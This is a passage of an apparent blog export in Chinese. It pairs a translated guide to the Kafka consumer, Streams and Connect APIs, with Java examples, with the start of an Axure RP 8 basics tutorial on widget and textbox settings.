<h2 id="发现消费者故障"><a href="#发现消费者故障" class="headerlink" title="发现消费者故障"></a>发现消费者故障</h2><p>订阅一组topic后，当调用poll(long）时，消费者将自动加入到组中。只要持续的调用poll，消费者将一直保持可用，并继续从分配的分区中接收消息。此外，消费者向服务器定时发送心跳。 如果消费者崩溃或无法在session.timeout.ms配置的时间内发送心跳，则消费者将被视为死亡，并且其分区将被重新分配。</p>
<p>还有一种可能，消费可能遇到“活锁”的情况，它持续的发送心跳，但是没有处理。为了预防消费者在这种情况下一直持有分区，我们使用max.poll.interval.ms活跃检测机制。 在此基础上，如果你调用的poll的频率大于最大间隔，则客户端将主动地离开组，以便其他消费者接管该分区。 发生这种情况时，你会看到offset提交失败（调用commitSync（）引发的CommitFailedException）。这是一种安全机制，保障只有活动成员能够提交offset。所以要留在组中，你必须持续调用poll。</p>
<p>消费者提供两个配置设置来控制poll循环：</p>
<ol>
<li><p>max.poll.interval.ms：增大poll的间隔，可以为消费者提供更多的时间去处理返回的消息（调用poll(long)返回的消息，通常返回的消息都是一批）。缺点是此值越大将会延迟组重新平衡。</p>
</li>
<li><p>max.poll.records：此设置限制每次调用poll返回的消息数，这样可以更容易的预测每次poll间隔要处理的最大值。通过调整此值，可以减少poll间隔，减少重新平衡分组的</p>
</li>
</ol>
<p>对于消息处理时间不可预测地的情况，这些选项是不够的。 处理这种情况的推荐方法是将消息处理移到另一个线程中，让消费者继续调用poll。 但是必须注意确保已提交的offset不超过实际位置。另外，你必须禁用自动提交，并只有在线程完成处理后才为记录手动提交偏移量（取决于你）。 还要注意，你需要pause暂停分区，不会从poll接收到新消息，让线程处理完之前返回的消息（如果你的处理能力比拉取消息的慢，那创建新线程将导致你机器内存溢出）。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>这个消费者API提供了灵活性，以涵盖各种消费场景，下面是一些例子来演示如何使用它们。</p>
<h2 id="自动提交偏移量"><a href="#自动提交偏移量" class="headerlink" title="自动提交偏移量"></a>自动提交偏移量</h2><p>这是个【自动提交偏移量】的简单的kafka消费者API。<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Properties props = <span class="keyword">new</span> Properties();</span><br><span class="line">   props.put(<span class="string">"bootstrap.servers"</span>, <span class="string">"localhost:9092"</span>);</span><br><span class="line">   props.put(<span class="string">"group.id"</span>, <span class="string">"test"</span>);</span><br><span class="line">   props.put(<span class="string">"enable.auto.commit"</span>, <span class="string">"true"</span>);</span><br><span class="line">   props.put(<span class="string">"auto.commit.interval.ms"</span>, <span class="string">"1000"</span>);</span><br><span class="line">   props.put(<span class="string">"key.deserializer"</span>, <span class="string">"org.apache.kafka.common.serialization.StringDeserializer"</span>);</span><br><span class="line">   props.put(<span class="string">"value.deserializer"</span>, <span class="string">"org.apache.kafka.common.serialization.StringDeserializer"</span>);</span><br><span class="line">   KafkaConsumer&lt;String, String&gt; consumer = <span class="keyword">new</span> KafkaConsumer&lt;&gt;(props);</span><br><span class="line">   consumer.subscribe(Arrays.asList(<span class="string">"foo"</span>, <span class="string">"bar"</span>));</span><br><span class="line">   <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">       ConsumerRecords&lt;String, String&gt; records = consumer.poll(<span class="number">100</span>);</span><br><span class="line">       <span class="keyword">for</span> (ConsumerRecord&lt;String, String&gt; record : records)</span><br><span class="line">           System.out.printf(<span class="string">"offset = %d, key = %s, value = %s%n"</span>, record.offset(), record.key(), record.value());</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p>
<p>设置enable.auto.commit,偏移量由auto.commit.interval.ms控制自动提交的频率。</p>
<p>集群是通过配置bootstrap.servers指定一个或多个broker。不用指定全部的broker，它将自动发现集群中的其余的borker（最好指定多个，万一有服务器故障）。</p>
<p>在这个例子中，客户端订阅了主题foo和bar。消费者组叫test。</p>
<p>broker通过心跳机器自动检测test组中失败的进程，消费者会自动ping集群，告诉进群它还活着。只要消费者能够做到这一点，它就被认为是活着的，并保留分配给它分区的权利，如果它停止心跳的时间超过session.timeout.ms,那么就会认为是故障的，它的分区将被分配到别的进程。</p>
<p>这个deserializer设置如何把byte转成object类型，例子中，通过指定string解析器，我们告诉获取到的消息的key和value只是简单个string类型。</p>
<h2 id="手动控制偏移量"><a href="#手动控制偏移量" class="headerlink" title="手动控制偏移量"></a>手动控制偏移量</h2><p>不需要定时的提交offset，可以自己控制offset，当消息认为已消费过了，这个时候再去提交它们的偏移量。这个很有用的，当消费的消息结合了一些处理逻辑，这个消息就不应该认为是已经消费的，直到它完成了整个处理。<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Properties props = <span class="keyword">new</span> Properties();</span><br><span class="line">     props.put(<span class="string">"bootstrap.servers"</span>, <span class="string">"localhost:9092"</span>);</span><br><span class="line">     props.put(<span class="string">"group.id"</span>, <span class="string">"test"</span>);</span><br><span class="line">     props.put(<span class="string">"enable.auto.commit"</span>, <span class="string">"false"</span>);</span><br><span class="line">     props.put(<span class="string">"auto.commit.interval.ms"</span>, <span class="string">"1000"</span>);</span><br><span class="line">     props.put(<span class="string">"session.timeout.ms"</span>, <span class="string">"30000"</span>);</span><br><span class="line">     props.put(<span class="string">"key.deserializer"</span>, <span class="string">"org.apache.kafka.common.serialization.StringDeserializer"</span>);</span><br><span class="line">     props.put(<span class="string">"value.deserializer"</span>, <span class="string">"org.apache.kafka.common.serialization.StringDeserializer"</span>);</span><br><span class="line">     KafkaConsumer&lt;String, String&gt; consumer = <span class="keyword">new</span> KafkaConsumer&lt;&gt;(props);</span><br><span class="line">     consumer.subscribe(Arrays.asList(<span class="string">"foo"</span>, <span class="string">"bar"</span>));</span><br><span class="line">     <span class="keyword">final</span> <span class="keyword">int</span> minBatchSize = <span class="number">200</span>;</span><br><span class="line">     List&lt;ConsumerRecord&lt;String, String&gt;&gt; buffer = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">     <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">         ConsumerRecords&lt;String, String&gt; records = consumer.poll(<span class="number">100</span>);</span><br><span class="line">         <span class="keyword">for</span> (ConsumerRecord&lt;String, String&gt; record : records) &#123;</span><br><span class="line">             buffer.add(record);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">if</span> (buffer.size() &gt;= minBatchSize) &#123;</span><br><span class="line">             insertIntoDb(buffer);</span><br><span class="line">             consumer.commitSync();</span><br><span class="line">             buffer.clear();</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure></p>
<p>在这个例子中，我们将消费一批消息并将它们存储在内存中。当我们积累足够多的消息后，我们再将它们批量插入到数据库中。如果我们设置offset自动提交（之前说的例子），消费将被认为是已消费的。这样会出现问题，我们的进程可能在批处理记录之后，但在它们被插入到数据库之前失败了。</p>
<p>为了避免这种情况，我们将在相应的记录插入数据库之后再手动提交偏移量。这样我们可以准确控制消息是成功消费的。提出一个相反的可能性：在插入数据库之后，但是在提交之前，这个过程可能会失败（即使这可能只是几毫秒，这是一种可能性）。在这种情况下，进程将获取到已提交的偏移量，并会重复插入的最后一批数据。这种方式就是所谓的“至少一次”保证，在故障情况下，可以重复。</p>
<p>如果您无法执行这些操作，可能会使已提交的偏移超过消耗的位置，从而导致缺少记录。 使用手动偏移控制的优点是，您可以直接控制记录何时被视为“已消耗”。</p>
<p>注意：使用自动提交也可以“至少一次”。但是要求你必须下次调用poll（long）之前或关闭消费者之前，处理完所有返回的数据。如果操作失败，这将会导致已提交的offset超过消费的位置，从而导致丢失消息。使用手动控制offset的有点是，你可以直接控制消息何时提交。、</p>
<p>上面的例子使用commitSync表示所有收到的消息为”已提交”，在某些情况下，你可以希望更精细的控制，通过指定一个明确消息的偏移量为“已提交”。在下面，我们的例子中，我们处理完每个分区中的消息后，提交偏移量。<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="keyword">while</span>(running) &#123;</span><br><span class="line">             ConsumerRecords&lt;String, String&gt; records = consumer.poll(Long.MAX_VALUE);</span><br><span class="line">             <span class="keyword">for</span> (TopicPartition partition : records.partitions()) &#123;</span><br><span class="line">                 List&lt;ConsumerRecord&lt;String, String&gt;&gt; partitionRecords = records.records(partition);</span><br><span class="line">                 <span class="keyword">for</span> (ConsumerRecord&lt;String, String&gt; record : partitionRecords) &#123;</span><br><span class="line">                     System.out.println(record.offset() + <span class="string">": "</span> + record.value());</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">long</span> lastOffset = partitionRecords.get(partitionRecords.size() - <span class="number">1</span>).offset();</span><br><span class="line">                 consumer.commitSync(Collections.singletonMap(partition, <span class="keyword">new</span> OffsetAndMetadata(lastOffset + <span class="number">1</span>)));</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">       consumer.close();</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure></p>
<p>注意：已提交的offset应始终是你的程序将读取的下一条消息的offset。因此，调用commitSync（offsets）时，你应该加1个到最后处理的消息的offset。</p>
<h2 id="订阅指定的分区"><a href="#订阅指定的分区" class="headerlink" title="订阅指定的分区"></a>订阅指定的分区</h2><p>在前面的例子中，我们订阅我们感兴趣的topic，让kafka提供给我们平分后的topic分区。但是，在有些情况下，你可能需要自己来控制分配指定分区，例如：</p>
<ol>
<li>如果这个消费者进程与该分区保存了某种本地状态（如本地磁盘的键值存储），则它应该只能获取这个分区的消息。</li>
<li>如果消费者进程本身具有高可用性，并且如果它失败，会自动重新启动（可能使用集群管理框架如YARN，Mesos，或者AWS设施，或作为一个流处理框架的一部分）。 在这种情况下，不需要Kafka检测故障，重新分配分区，因为消费者进程将在另一台机器上重新启动。</li>
</ol>
<p>要使用此模式，，你只需调用assign（Collection）消费指定的分区即可：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String topic = <span class="string">"foo"</span>;</span><br><span class="line">TopicPartition partition0 = <span class="keyword">new</span> TopicPartition(topic, <span class="number">0</span>);</span><br><span class="line">TopicPartition partition1 = <span class="keyword">new</span> TopicPartition(topic, <span class="number">1</span>);</span><br><span class="line">consumer.assign(Arrays.asList(partition0, partition1));</span><br></pre></td></tr></table></figure></p>
<p>一旦手动分配分区，你可以在循环中调用poll（跟前面的例子一样）。消费者分组仍需要提交offset，只是现在分区的设置只能通过调用assign修改，因为手动分配不会进行分组协调，因此消费者故障不会引发分区重新平衡。每一个消费者是独立工作的（即使和其他的消费者共享GroupId）。为了避免offset提交冲突，通常你需要确认每一个consumer实例的gorupId都是唯一的。</p>
<p>注意，手动分配分区（即，assgin）和动态分区分配的订阅topic模式（即，subcribe）不能混合使用。</p>
<h2 id="offset存储在其他地方"><a href="#offset存储在其他地方" class="headerlink" title="offset存储在其他地方"></a>offset存储在其他地方</h2><p>消费者可以不使用kafka内置的offset仓库。可以选择自己来存储offset。要注意的是，将消费的offset和结果存储在同一个的系统中，用原子的方式存储结果和offset，但这不能保证原子，要想消费是完全原子的，并提供的“正好一次”的消费保证比kafka默认的“至少一次”的语义要更高。你需要使用kafka的offset提交功能。</p>
<p>这有结合的例子。</p>
<ol>
<li><p>如果消费的结果存储在关系数据库中，存储在数据库的offset，让提交结果和offset在单个事务中。这样，事物成功，则offset存储和更新。如果offset没有存储，那么偏移量也不会被更新。</p>
</li>
<li><p>如果offset和消费结果存储在本地仓库。例如，可以通过订阅一个指定的分区并将offset和索引数据一起存储来构建一个搜索索引。如果这是以原子的方式做的，常见的可能是，即使崩溃引起未同步的数据丢失。索引程序从它确保没有更新丢失的地方恢复，而仅仅丢失最近更新的消息。</p>
</li>
</ol>
<p>每个消息都有自己的offset，所以要管理自己的偏移，你只需要做到以下几点：</p>
<ol>
<li>配置 enable.auto.commit=false</li>
<li>使用提供的 ConsumerRecord 来保存你的位置。</li>
<li>在重启时用 seek(TopicPartition, long) 恢复消费者的位置。</li>
</ol>
<p>当分区分配也是手动完成的（像上文搜索索引的情况），这种类型的使用是最简单的。 如果分区分配是自动完成的，需要特别小心处理分区分配变更的情况。可以通过调用subscribe（Collection，ConsumerRebalanceListener）和subscribe（Pattern，ConsumerRebalanceListener）中提供的ConsumerRebalanceListener实例来完成的。例如，当分区向消费者获取时，消费者将通过实现ConsumerRebalanceListener.onPartitionsRevoked（Collection）来给这些分区提交它们offset。当分区分配给消费者时，消费者通过ConsumerRebalanceListener.onPartitionsAssigned(Collection)为新的分区正确地将消费者初始化到该位置。</p>
<p>ConsumerRebalanceListener的另一个常见用法是清除应用已移动到其他位置的分区的缓存。</p>
<h2 id="控制消费的位置"><a href="#控制消费的位置" class="headerlink" title="控制消费的位置"></a>控制消费的位置</h2><p>大多数情况下，消费者只是简单的从头到尾的消费消息，周期性的提交位置（自动或手动）。kafka也支持消费者去手动的控制消费的位置，可以消费之前的消息也可以跳过最近的消息。</p>
<p>有几种情况，手动控制消费者的位置可能是有用的。</p>
<p>一种场景是对于时间敏感的消费者处理程序，对足够落后的消费者，直接跳过，从最近的消费开始消费。</p>
<p>另一个使用场景是本地状态存储系统（上一节说的）。在这样的系统中，消费者将要在启动时初始化它的位置（无论本地存储是否包含）。同样，如果本地状态已被破坏（假设因为磁盘丢失），则可以通过重新消费所有数据并重新创建状态（假设kafka保留了足够的历史）在新的机器上重新创建。</p>
<p>kafka使用seek(TopicPartition, long)指定新的消费位置。用于查找服务器保留的最早和最新的offset的特殊的方法也可用（seekToBeginning(Collection) 和 seekToEnd(Collection)）。</p>
<h2 id="消费者流量控制"><a href="#消费者流量控制" class="headerlink" title="消费者流量控制"></a>消费者流量控制</h2><p>如果消费者分配了多个分区，并同时消费所有的分区，这些分区具有相同的优先级。在一些情况下，消费者需要首先消费一些指定的分区，当指定的分区有少量或者已经没有可消费的数据时，则开始消费其他分区。</p>
<p>例如流处理，当处理器从2个topic获取消息并把这两个topic的消息合并，当其中一个topic长时间落后另一个，则暂停消费，以便落后的赶上来。</p>
<p>kafka支持动态控制消费流量，分别在future的poll(long)中使用pause(Collection) 和 resume(Collection) 来暂停消费指定分配的分区，重新开始消费指定暂停的分区。</p>
<h2 id="多线程处理"><a href="#多线程处理" class="headerlink" title="多线程处理"></a>多线程处理</h2><p>Kafka消费者不是线程安全的。所有网络I/O都发生在进行调用应用程序的线程中。用户的责任是确保多线程访问正确同步的。非同步访问将导致ConcurrentModificationException。</p>
<p>此规则唯一的例外是wakeup()，它可以安全地从外部线程来中断活动操作。在这种情况下，将从操作的线程阻塞并抛出一个WakeupException。这可用于从其他线程来关闭消费者。 以下代码段显示了典型模式：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">KafkaConsumerRunner</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">final</span> AtomicBoolean closed = <span class="keyword">new</span> AtomicBoolean(<span class="keyword">false</span>);</span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">final</span> KafkaConsumer consumer;</span><br><span class="line"></span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">             consumer.subscribe(Arrays.asList(<span class="string">"topic"</span>));</span><br><span class="line">             <span class="keyword">while</span> (!closed.get()) &#123;</span><br><span class="line">                 ConsumerRecords records = consumer.poll(<span class="number">10000</span>);</span><br><span class="line">                 <span class="comment">// Handle new records</span></span><br><span class="line">             &#125;</span><br><span class="line">         &#125; <span class="keyword">catch</span> (WakeupException e) &#123;</span><br><span class="line">             <span class="comment">// Ignore exception if closing</span></span><br><span class="line">             <span class="keyword">if</span> (!closed.get()) <span class="keyword">throw</span> e;</span><br><span class="line">         &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">             consumer.close();</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// Shutdown hook which can be called from a separate thread</span></span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shutdown</span><span class="params">()</span> </span>&#123;</span><br><span class="line">         closed.set(<span class="keyword">true</span>);</span><br><span class="line">         consumer.wakeup();</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
<p>在单独的线程中，可以通过设置关闭标志和唤醒消费者来关闭消费者。<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> closed.set(<span class="keyword">true</span>);</span><br><span class="line">consumer.wakeup();</span><br></pre></td></tr></table></figure></p>
<p>我们没有多线程模型的例子。但留下几个操作可用来实现多线程处理消息。</p>
<ol>
<li>每个线程一个消费者<br>每个线程自己的消费者实例。这里是这种方法的优点和缺点：<br>PRO: 这是最容易实现的<br>PRO: 因为它不需要在线程之间协调，所以通常它是最快的。<br>PRO: 它按顺序处理每个分区（每个线程只处理它接受的消息）。<br>CON: 更多的消费者意味着更多的TCP连接到集群（每个线程一个）。一般kafka处理连接非常的快，所以这是一个小成本。<br>CON: 更多的消费者意味着更多的请求被发送到服务器，但稍微较少的数据批次可能导致I/O吞吐量的一些下降。<br>CON: 所有进程中的线程总数受到分区总数的限制。</li>
<li>解耦消费和处理<br>另一个替代方式是一个或多个消费者线程，它来消费所有数据，其消费所有数据并将ConsumerRecords实例切换到由实际处理记录处理的处理器线程池来消费的阻塞队列。这个选项同样有利弊：<br>PRO: 可扩展消费者和处理进程的数量。这样单个消费者的数据可分给多个处理器线程来执行，避免对分区的任何限制。<br>CON: 跨多个处理器的顺序保证需要特别注意，因为线程是独立的执行，后来的消息可能比遭到的消息先处理，这仅仅是因为线程执行的运气。如果对排序没有问题，这就不是个问题。<br>CON: 手动提交变得更困难，因为它需要协调所有的线程以确保处理对该分区的处理完成。<br>这种方法有多种玩法，例如，每个处理线程可以有自己的队列，消费者线程可以使用TopicPartitionhash到这些队列中，以确保按顺序消费，并且提交也将简化。</li>
</ol>
<h1 id="Kafka-Streams-API"><a href="#Kafka-Streams-API" class="headerlink" title="Kafka Streams API"></a>Kafka Streams API</h1><p>2.3 Streams API<br>在0.10.0增加了一个新的客户端库，Kafka Stream，Kafka Stream具有Alpha的优点，你可以使用maven引入到你的项目：<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.kafka<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>kafka-streams<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.10.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>如何使用，请点击这里。（注意，@InterfaceStability.Unstable注解的类，是公共API，在未来可能改变，不保证向后兼容）</p>
<h1 id="KafkaStreams客户端（0-10-1-1-API）"><a href="#KafkaStreams客户端（0-10-1-1-API）" class="headerlink" title="KafkaStreams客户端（0.10.1.1 API）"></a>KafkaStreams客户端（0.10.1.1 API）</h1><p>Kafka Streams从一个或多个输入topic进行连续的计算并输出到0或多个外部topic中。</p>
<p>可以通过TopologyBuilder类定义一个计算逻辑处理器DAG拓扑。或者也可以通过提供的高级别KStream DSL来定义转换的KStreamBuilder。（PS：计算逻辑其实就是自己的代码逻辑）</p>
<p>KafkaStreams类管理Kafka Streams实例的生命周期。一个stream实例可以在配置文件中为处理器指定一个或多个Thread。</p>
<p>KafkaStreams实例可以作为单个streams处理客户端（也可能是分布式的），与其他的相同应用ID的实例进行协调（无论是否在同一个进程中，在同一台机器的其他进程中，或远程机器上）。这些实例将根据输入topic分区的基础上来划分工作，以便所有的分区都被消费掉。如果实例添加或失败，所有实例将重新平衡它们之间的分区分配，以保证负载平衡。</p>
<p>在内部，KafkaStreams实例包含一个正常的KafkaProducer和KafkaConsumer实例，用于读取和写入，</p>
<p>一个简单的例子：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map&lt;String, Object&gt; props = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">props.put(StreamsConfig.APPLICATION_ID_CONFIG, <span class="string">"my-stream-processing-application"</span>);</span><br><span class="line">props.put(StreamsConfig.BOOTSTRAP_SERVERS_CONFIG, <span class="string">"localhost:9092"</span>);</span><br><span class="line">props.put(StreamsConfig.KEY_SERDE_CLASS_CONFIG, Serdes.String().getClass().getName());</span><br><span class="line">props.put(StreamsConfig.VALUE_SERDE_CLASS_CONFIG, Serdes.String().getClass().getName());</span><br><span class="line">StreamsConfig config = <span class="keyword">new</span> StreamsConfig(props);</span><br><span class="line"></span><br><span class="line">KStreamBuilder builder = <span class="keyword">new</span> KStreamBuilder();</span><br><span class="line">builder.stream(<span class="string">"my-input-topic"</span>).mapValues(value -&gt; value.length().toString()).to(<span class="string">"my-output-topic"</span>);</span><br><span class="line"></span><br><span class="line">KafkaStreams streams = <span class="keyword">new</span> KafkaStreams(builder, config);</span><br><span class="line">streams.start();</span><br></pre></td></tr></table></figure></p>
<h1 id="Kafka-Connect-API"><a href="#Kafka-Connect-API" class="headerlink" title="Kafka Connect API"></a>Kafka Connect API</h1><p>Connect API实现一个连接器（connector），不断地从一些数据源系统拉取数据到kafka，或从kafka推送到宿系统（sink system）。</p>
<p>大多数Connect使用者不需要直接操作这个API，可以使用之前构建的连接器，不需要编写任何代码。有关Connect的其他信息，点击这里。</p>
<p>想实现自定义连接器的，可以看javadoc。</p>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>kafka</tag>
      </tags>
  </entry>
  <entry>
    <title>axure8.0基础教程</title>
    <url>/2019/05/21/axure8-0%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>本文引用自小楼老师博客:<a href="http://www.iaxure.com/3768.html" target="_blank" rel="noopener">AxureRP8实战手册-基础操作篇</a>。<br><a id="more"></a></p>
<h1 id="AxureRP8实战手册（基础1-10）"><a href="#AxureRP8实战手册（基础1-10）" class="headerlink" title="AxureRP8实战手册（基础1-10）"></a>AxureRP8实战手册（基础1-10）</h1><h2 id="基础操作篇"><a href="#基础操作篇" class="headerlink" title="基础操作篇"></a>基础操作篇</h2><p>本篇包含56种常见的基础操作，初学者应在掌握本篇内容后再进行实战案例篇的学习，以免产生学习障碍。同时，建议具备一定基础的读者学习本篇中相对生疏的内容，并加以掌握。</p>
<h2 id="第1章-使用元件"><a href="#第1章-使用元件" class="headerlink" title="第1章 使用元件"></a>第1章 使用元件</h2><h2 id="基础1-添加元件到画布"><a href="#基础1-添加元件到画布" class="headerlink" title="基础1. 添加元件到画布"></a>基础1. 添加元件到画布</h2><p>在左侧元件库中选择要使用的元件，按住鼠标左键不放，拖动到画布适合的位置上松开。（图1-1）<br><img src="https://mfaying.github.io/images/axure/1.jpg" alt="avatar"></p>
<h2 id="基础2-添加元件名称"><a href="#基础2-添加元件名称" class="headerlink" title="基础2. 添加元件名称"></a>基础2. 添加元件名称</h2><p>文本框属性中输入元件的自定义名称，建议采用英文命名。</p>
<p>建议格式：PasswordInput01或Password01</p>
<p>名称含义：序号01的密码输入框</p>
<p>格式说明：“Password”表示主要用途；“Input”表示元件类型，一般情况下可省略，当有不同类型的同名元件需要区分或名称不能明确表达用途的时候使用；“01”表示出现多个同名元件时的编号；单词首字母大写的书写格式便于阅读。（图1-2）<br><img src="https://mfaying.github.io/images/axure/2.jpg" alt="avatar"></p>
<h2 id="基础3-设置元件位置-尺寸"><a href="#基础3-设置元件位置-尺寸" class="headerlink" title="基础3. 设置元件位置/尺寸"></a>基础3. 设置元件位置/尺寸</h2><p>元件的位置与尺寸可以通过鼠标拖拽调整，也可以在快捷功能或元件样式中进行输入调整。（图1-3）</p>
<p>x：指元件在画布中的x轴坐标值。</p>
<p>y：指元件在画布中的y轴坐标值。</p>
<p>w：指元件的宽度值。</p>
<p>h：指元件的高度值。<br><img src="https://mfaying.github.io/images/axure/3.jpg" alt="avatar"></p>
<p>在输入数值调整元件尺寸时，可以在样式中设置，让元件【保持宽高比例】。（图1-4）<br><img src="https://mfaying.github.io/images/axure/4.jpg" alt="avatar"></p>
<h2 id="基础4-设置元件默认角度"><a href="#基础4-设置元件默认角度" class="headerlink" title="基础4. 设置元件默认角度"></a>基础4. 设置元件默认角度</h2><p>方式一：选择需要改变角度的元件，按住键的同时，用鼠标拖动元件的节点到合适的角度。（图1-5）</p>
<p>方式二：在元件样式中进行角度的设置，元件的角度与元件文字的角度可以分开设置。（图1-5）<br><img src="https://mfaying.github.io/images/axure/5.jpg" alt="avatar"></p>
<h2 id="基础5-设置元件颜色与透明"><a href="#基础5-设置元件颜色与透明" class="headerlink" title="基础5. 设置元件颜色与透明"></a>基础5. 设置元件颜色与透明</h2><p>选择要改变颜色的元件，点击快捷功能区中的背景颜色设置按钮，选取相应的颜色，或者在元件样式中进行设置。（图1-6）<br><img src="https://mfaying.github.io/images/axure/6.jpg" alt="avatar"></p>
<h2 id="基础6-设置形状或图片圆角"><a href="#基础6-设置形状或图片圆角" class="headerlink" title="基础6. 设置形状或图片圆角"></a>基础6. 设置形状或图片圆角</h2><p>可以通过拖动元件左上方的圆点图标进行调整，也可以在元件样式中设置圆角半径来实现。（图1-7）<br><img src="https://mfaying.github.io/images/axure/7.jpg" alt="avatar"></p>
<h2 id="基础7-设置矩形仅显示部分边框"><a href="#基础7-设置矩形仅显示部分边框" class="headerlink" title="基础7. 设置矩形仅显示部分边框"></a>基础7. 设置矩形仅显示部分边框</h2><p>在Axure RP 8的版本中，矩形的边框可以在样式中设置显示全部或部分。（图1-8）<br><img src="https://mfaying.github.io/images/axure/8.jpg" alt="avatar"></p>
<h2 id="基础8-设置线段-箭头-边框样式"><a href="#基础8-设置线段-箭头-边框样式" class="headerlink" title="基础8. 设置线段/箭头/边框样式"></a>基础8. 设置线段/箭头/边框样式</h2><p>线段、箭头和元件边框的样式可以在快捷功能或者元件样式中进行设置。（图1-9）<br><img src="https://mfaying.github.io/images/axure/9.jpg" alt="avatar"></p>
<h2 id="基础9-设置元件文字边距-行距"><a href="#基础9-设置元件文字边距-行距" class="headerlink" title="基础9. 设置元件文字边距/行距"></a>基础9. 设置元件文字边距/行距</h2><p>在元件样式中可以设置元件文字的【行间距】与【填充】。（图1-10）</p>
<p>行间距：是指文字段落行与行之间的空隙。</p>
<p>填充：是指文字与形状边缘之间填充的空隙。<br><img src="https://mfaying.github.io/images/axure/10.jpg" alt="avatar"></p>
<h2 id="基础10-设置元件默认隐藏"><a href="#基础10-设置元件默认隐藏" class="headerlink" title="基础10. 设置元件默认隐藏"></a>基础10. 设置元件默认隐藏</h2><p>选择要隐藏的元件，在快捷功能或者元件样式中勾选【隐藏】选项。（图1-11）<br><img src="https://mfaying.github.io/images/axure/11.jpg" alt="avatar"></p>
<h2 id="基础11-设置文本框输入为密码"><a href="#基础11-设置文本框输入为密码" class="headerlink" title="基础11. 设置文本框输入为密码"></a>基础11. 设置文本框输入为密码</h2><p>文本框属性中选择文本框的{类型}为【密码】。（图1-12）<br><img src="https://mfaying.github.io/images/axure/12.jpg" alt="avatar"></p>
<h2 id="基础12-设置打开选择文件窗口"><a href="#基础12-设置打开选择文件窗口" class="headerlink" title="基础12. 设置打开选择文件窗口"></a>基础12. 设置打开选择文件窗口</h2><p>文本框属性中选择文本框的{类型}为【文件】，即可在浏览器中变成打开选择本地文件的按钮。该按钮样式各浏览器略有不同。（图1-13）<br><img src="https://mfaying.github.io/images/axure/13.jpg" alt="avatar"></p>
<h2 id="基础13-限制文本框输入字符位数"><a href="#基础13-限制文本框输入字符位数" class="headerlink" title="基础13. 限制文本框输入字符位数"></a>基础13. 限制文本框输入字符位数</h2><p>在文本框属性中输入文本框的{最大长度}为指定长度的数字。（图1-14）<br><img src="https://mfaying.github.io/images/axure/14.jpg" alt="avatar"></p>
<h2 id="基础14-设置文本框提示文字"><a href="#基础14-设置文本框提示文字" class="headerlink" title="基础14. 设置文本框提示文字"></a>基础14. 设置文本框提示文字</h2><p>在文本框属性中输入文本框的{提示文字}。提示文字的字体、颜色、对齐方式等样式可以点击【提示样式】进行设置。（图1-15）</p>
<p>提示文字设置包含{隐藏提示触发}选项，其中：</p>
<p>输入：指用户开始输入时提示文字才消失。</p>
<p>获取焦点：指光标进入文本框时提示文字即消失。</p>
<p><img src="https://mfaying.github.io/images/axure/15.jpg" alt="avatar"></p>
<h2 id="基础15-设置文本框回车触发事件"><a href="#基础15-设置文本框回车触发事件" class="headerlink" title="基础15. 设置文本框回车触发事件"></a>基础15. 设置文本框回车触发事件</h2><p>文本框回车触发事件是指在文本框输入状态下按&lt;回车&gt;键，可以触发某个元件的【鼠标单击时】事件。只需在文本框属性中{提交按钮}的列表中选择相应的元件即可。（图1-16）<br><img src="https://mfaying.github.io/images/axure/16.jpg" alt="avatar"></p>
